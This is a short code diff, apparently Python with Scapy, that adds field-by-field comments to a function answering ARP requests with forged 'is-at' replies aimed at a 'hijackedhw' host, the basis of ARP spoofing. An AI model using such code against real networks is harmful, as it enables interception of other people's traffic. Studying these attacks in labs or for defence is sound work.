@@ -21,11 +21,22 @@ def handle_arp_packets(packet):
     if ARP in packet and packet[ARP].op == 1:
         ether_resp = Ether(dst=hijackedhw, type=0x806, src=myhw)
         arp_response = ARP(pdst=hijackedhw)
+        
+        # Opcode (reply) "is-at"
         arp_response.op = 2
+
+        # Protocol size
         arp_response.plen = 4
+
+        # Hardware size
         arp_response.hwlen = 6
+
+        # Protocol type is IPv4 
         arp_response.ptype = 0x800
+        
+        # Hardware type: Ethernet 
         arp_response.hwtype = 1
+
         arp_response.hwsrc = myhw
         arp_response.psrc = myip
         arp_response.hwdst = hijackedhw
